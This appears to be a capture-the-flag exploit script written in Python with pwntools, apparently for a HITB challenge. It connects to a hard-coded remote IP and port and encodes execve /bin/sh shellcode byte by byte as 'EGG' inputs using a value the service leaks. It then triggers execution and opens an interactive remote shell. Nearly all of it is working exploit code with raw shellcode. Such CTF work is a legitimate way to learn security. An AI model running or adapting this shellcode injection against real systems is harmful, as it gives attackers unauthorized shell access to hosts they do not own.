from pwn import *
import time
#52.17.31.229:31337
sh = remote("52.17.31.229", 31337)
#sh = process("/root/Desktop/ctf/HITB/910abf341053d25831ecb465b7ddf738")
#sh = process("/bin/sh")
#sh.sendline("gdb /root/Desktop/ctf/HITB/910abf341053d25831ecb465b7ddf738")
#sh.recvuntil("gdb-peda$",timeout=1)
#sh.sendline("b *0x400e1b")
#sh.recvuntil("gdb-peda$",timeout=1)
#sh.sendline("b *0x400ed7")
#sh.recvuntil("gdb-peda$",timeout=1)
#sh.sendline("r")
print "RUN DEBUGGER"
sh.recvuntil("w4rm3d up to ")
data = sh.recvuntil("d3greez")

data = data.split()[0]
print "MyData {}".format(data)

def calc_offset(want, rand):
    HEX = "EGG"
    sum = 0
    for byte in HEX:
        sum += int(ord(byte))
    sum = sum+rand
    while(sum > 256):
        sum-=256
    want = int(ord(want))
    if want > sum:
        print want-sum
        return chr(want-sum)
    else:
        want += 256
        print want-sum
        return chr(want-sum)

def send_exploit(sh, shellcode, rand):
    #send shellcode byte by byte
    offset=""
    count =0
    for byte in shellcode:
        print "Send ShellCode {}".format(count)
        count+=1
        offset = calc_offset(byte, rand)
        print "Sending " + "EGG{}".format(offset)
        sh.sendline("EGG{}".format(offset))
        sh.recvuntil("ingredient>", timeout=1)

shellcode ="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #execve
print data
temp = int(data)
print temp
rand = temp/4919
print "Rand is {} ".format(rand)
print sh.recvuntil("ingredient>")

send_exploit(sh, shellcode, rand)
print "send sploit"
sh.sendline("BAKE")
#print sh.recvuntil("heheh..", timeout=4)
time.sleep(3)
sh.interactive()
sh.close()
